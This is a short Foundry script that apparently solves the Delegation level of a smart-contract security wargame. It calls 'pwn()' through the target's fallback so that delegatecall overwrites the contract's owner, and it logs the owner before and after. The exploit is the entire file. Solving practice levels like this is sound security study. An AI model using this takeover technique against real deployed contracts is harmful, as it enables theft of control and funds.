// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Delegation} from "../src/levels/Delegation.sol";

contract DelegationScript is Script {
    Delegation public parity = Delegation(payable(0x800Eb73Be110dA8d116DBb576E4BC03bb83E5461));

    function run() external {
	vm.startBroadcast();
	console.log("Initial owner:", parity.owner());
	console.log("Attacking...");
	(bool success, ) = address(parity).call(abi.encodeWithSignature("pwn()"));
	require(success, "Attack failed!");
	console.log("New owner:", parity.owner());
	vm.stopBroadcast();
    }
}
